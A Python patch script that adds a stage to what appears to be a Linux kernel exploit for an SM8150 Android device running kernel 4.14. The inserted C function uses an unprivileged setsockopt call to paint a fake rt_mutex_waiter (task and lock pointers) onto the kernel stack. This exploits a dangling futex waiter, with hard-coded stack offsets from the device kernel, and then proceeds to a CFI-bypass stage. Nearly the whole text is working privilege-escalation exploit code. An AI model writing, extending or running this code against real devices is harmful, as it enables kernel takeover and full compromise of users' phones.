import io, sys

# ---------- 1) fops.c : add do_setsockopt_fake_lock_route() ----------
p = 'src/core/fops.c'
s = open(p).read()

anchor = 'int repair_fake_fops_llseek(int fd) {'
assert s.count(anchor) == 1, ('anchor fops', s.count(anchor))

func = r'''
/* ============================================================================
 * setsockopt-based stack overlay (native 64-bit, Linux 4.14 on SM8150)
 *
 * Why: the pselect route paints the dangling rt_mutex_waiter through fd_set
 * bitmaps, which drags in word/shift/ABI/`res_*`-zeroing complications.  A far
 * simpler stack writer exists: sock_setsockopt() with an unknown
 * SOL_SOCKET optname keeps a 256-byte buffer on the kernel stack and copies
 * user bytes into it verbatim.
 *
 * Geometry verified from the device kernel (Image @ 0xffffff8008000000):
 *   SyS_setsockopt  : stp x29,x16,[sp,#-80]!   -> 0x50
 *   sock_setsockopt : sub sp,sp,#0x180, buf = sp+0x10  -> 0x180
 *   => buf = SP0 - 0x1c0   (fixed; no shift guessing)
 *   SyS_futex (native): sub sp,sp,#0x70 ; do_futex frame 0x210, rt_waiter=sp+0xd0
 *   => dangling waiter = SP0 - 0x1b0
 *   rt_mutex_waiter: task @ +0x30, lock @ +0x38
 *   => waiter->task == buf[0x40] ,  waiter->lock == buf[0x48]
 *
 * optname 1000 (0x3e8) takes the path:
 *     add x0, sp, #0x10 ; bl memset(buf,0,0xff)
 *     csel len = min(optlen, 0xfe) ; bl __arch_copy_from_user(buf, optval, len)
 * i.e. the copy happens before any optname handling, unprivileged.
 *
 * NOTE: setsockopt does not block.  The consumer fires while this thread parks
 * in userspace (no further syscalls), so the kernel stack region stays intact.
 * ============================================================================ */
int sock_paint_fd = -1;

void do_setsockopt_fake_lock_route(void) {
  if (!fake_lock || !fake_task) {
    cfi_last_step = 40;
    pr_error("ssopt route missing lock=%016zx task=%016zx\n", fake_lock, fake_task);
    return;
  }
  if (sock_paint_fd < 0) {
    sock_paint_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_paint_fd < 0) {
      cfi_last_step = 41;
      pr_error("ssopt socket() errno=%d\n", errno);
      return;
    }
  }

  struct timespec t0;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  int calls = 0, success = 0;
  for (int attempt = 1; attempt <= PSELECT_CFI_ROUTE_ATTEMPTS; attempt++) {
    unsigned char buf[0x50];
    memset(buf, 0, sizeof buf);
    put64(buf, 0x40, pselect_custom_write_enabled() ? fake_task
                                                    : text_addr(INIT_TASK));
    put64(buf, 0x48, fake_lock);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&pselect_select_done, 0);
    atomic_store(&pselect_walk_done, 0);
    int delay_usec = route_delay_usec(attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, attempt);

    pr_info("ssopt pre paint +%.0fms attempt=%d task=%016zx lock=%016zx len=%zu\n",
            fops_elapsed_ms(&t0), attempt, fake_task, fake_lock, sizeof buf);
    errno = 0;
    int ret = setsockopt(sock_paint_fd, SOL_SOCKET, 1000, buf,
                         (socklen_t)sizeof buf);
    int saved_errno = errno;
    atomic_store(&pselect_select_done, 1);
    /* Park in userspace: no further syscall may touch this thread's kernel
     * stack, so the fake waiter stays put for the consumer's walk. */
    for (int spin = 0;
         spin < 2000000000 && !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    pr_info("ssopt post paint +%.0fms ret=%d errno=%d walked=%d\n",
            fops_elapsed_ms(&t0), ret, saved_errno,
            atomic_load(&pselect_walk_done));
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("ssopt done attempt=%d calls=%d success=%d delay=%d step=%d errno=%d\n",
            attempt, calls, success, delay_usec, cfi_last_step, cfi_last_errno);
    if (calls > 0 && success > 0) {
      if (!route_only_mode) {
        try_cfi_stage();
      }
      break;
    }
  }
}

'''
s = s.replace(anchor, func + anchor, 1)
open(p, 'w').write(s)
print("fops.c: inserted do_setsockopt_fake_lock_route")

# ---------- 2) common.h : declare it ----------
p = 'src/core/common.h'
s = open(p).read()
a = 'void do_pselect_fake_lock_route(void);'
assert s.count(a) == 1, ('anchor common', s.count(a))
s = s.replace(a, a + '\nvoid do_setsockopt_fake_lock_route(void);', 1)
open(p, 'w').write(s)
print("common.h: declared")

# ---------- 3) main.c : dispatch in waiter_thread ----------
p = 'src/core/main.c'
s = open(p).read()
a = '  do_pselect_fake_lock_route();'
assert s.count(a) == 1, ('anchor main', s.count(a))
b = ('  if (env_flag("ROUTE_SETSOCKOPT", 0))\n'
     '    do_setsockopt_fake_lock_route();\n'
     '  else\n'
     '    do_pselect_fake_lock_route();')
s = s.replace(a, b, 1)
open(p, 'w').write(s)
print("main.c: dispatched")
